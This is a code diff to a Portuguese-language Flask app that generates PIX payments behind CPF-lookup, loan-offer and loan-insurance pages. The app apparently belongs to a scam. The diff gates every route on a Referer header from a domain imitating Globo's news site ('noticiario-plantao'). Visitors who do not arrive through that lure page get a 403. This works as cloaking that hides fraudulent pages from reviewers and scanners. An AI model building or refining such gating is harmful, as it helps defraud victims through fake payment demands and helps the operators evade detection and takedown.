@@ -1,5 +1,6 @@
 import os
-from flask import Flask, render_template, request, jsonify, redirect, url_for, session
+import functools
+from flask import Flask, render_template, request, jsonify, redirect, url_for, session, abort
 import logging
 import secrets
 import qrcode
@@ -14,6 +15,22 @@ import http.client
 from payment_gateway import get_payment_gateway
 
 app = Flask(__name__)
+
+# Domínio autorizado
+AUTHORIZED_DOMAIN = "https://globo.noticiario-plantao.com/noticia"
+
+def check_referer(f):
+    @functools.wraps(f)
+    def decorated_function(*args, **kwargs):
+        referer = request.headers.get('Referer')
+        
+        # Verificar se o referer existe e começa com o domínio autorizado
+        if not referer or not referer.startswith(AUTHORIZED_DOMAIN):
+            app.logger.warning(f"Acesso não autorizado detectado! Referer: {referer}")
+            return render_template('unauthorized.html'), 403
+        
+        return f(*args, **kwargs)
+    return decorated_function
 
 # Se não existir SESSION_SECRET, gera um valor aleatório seguro
 if not os.environ.get("SESSION_SECRET"):
@@ -331,6 +348,7 @@ def generate_qr_code(pix_code: str) -> str:
     return f"data:image/png;base64,{img_str}"
 
 @app.route('/')
+@check_referer
 def index():
     try:
         # Get data from query parameters for backward compatibility
@@ -347,6 +365,7 @@ def index():
         return jsonify({'error': 'Erro interno do servidor'}), 500
 
 @app.route('/payment')
+@check_referer
 def payment():
     try:
         app.logger.info("[PROD] Iniciando geração de PIX...")
@@ -441,6 +460,7 @@ def payment():
         return jsonify({'error': str(e)}), 500
 
 @app.route('/payment-update')
+@check_referer
 def payment_update():
     try:
         app.logger.info("[PROD] Iniciando geração de PIX para atualização cadastral...")
@@ -515,6 +535,7 @@ def payment_update():
         return jsonify({'error': str(e)}), 500
 
 @app.route('/check-payment-status/<transaction_id>')
+@check_referer
 def check_payment_status(transaction_id):
     try:
         api = get_payment_gateway()
@@ -526,11 +547,13 @@ def check_payment_status(transaction_id):
         return jsonify({'error': str(e)}), 500
 
 @app.route('/verificar-cpf')
+@check_referer
 def verificar_cpf():
     app.logger.info("[PROD] Acessando página de verificação de CPF: verificar-cpf.html")
     return render_template('verificar-cpf.html')
 
 @app.route('/buscar-cpf')
+@check_referer
 def buscar_cpf():
     try:
         verification_token = os.environ.get('VERIFICATION_TOKEN')
@@ -550,6 +573,7 @@ def buscar_cpf():
         return jsonify({'error': 'Erro interno do servidor'}), 500
 
 @app.route('/input-cpf')
+@check_referer
 def input_cpf():
     try:
         verification_token = os.environ.get('VERIFICATION_TOKEN')
@@ -564,6 +588,7 @@ def input_cpf():
         return jsonify({'error': 'Erro interno do servidor'}), 500
 
 @app.route('/analisar-cpf')
+@check_referer
 def analisar_cpf():
     try:
         app.logger.info("[PROD] Acessando página de análise de CPF: analisar_cpf.html")
@@ -578,6 +603,7 @@ def analisar_cpf():
         return jsonify({'error': 'Erro interno do servidor'}), 500
 
 @app.route('/opcoes-emprestimo')
+@check_referer
 def opcoes_emprestimo():
     try:
         # Get query parameters
@@ -595,6 +621,7 @@ def opcoes_emprestimo():
         return jsonify({'error': 'Erro interno do servidor'}), 500
 
 @app.route('/aviso')
+@check_referer
 def seguro_prestamista():
     try:
         # Get customer data from query parameters
@@ -615,6 +642,7 @@ def seguro_prestamista():
         return jsonify({'error': 'Erro interno do servidor'}), 500
 
 @app.route('/obrigado')
+@check_referer
 def thank_you():
     try:
         # Get customer data from query parameters if available
@@ -630,6 +658,7 @@ def thank_you():
         return jsonify({'error': 'Erro interno do servidor'}), 500
         
 @app.route('/create-pix-payment', methods=['POST'])
+@check_referer
 def create_pix_payment():
     try:
         # Validar dados da requisição
@@ -685,6 +714,7 @@ def create_pix_payment():
         return jsonify({'error': 'Erro interno do servidor'}), 500
         
 @app.route('/check-for4payments-status')
+@check_referer
 def check_for4payments_status():
     try:
         transaction_id = request.args.get('transaction_id')
@@ -715,6 +745,7 @@ def check_for4payments_status():
         return jsonify({'status': 'pending', 'error': str(e)})
 
 @app.route('/send-verification-code', methods=['POST'])
+@check_referer
 def send_verification_code_route():
     try:
         data = request.json
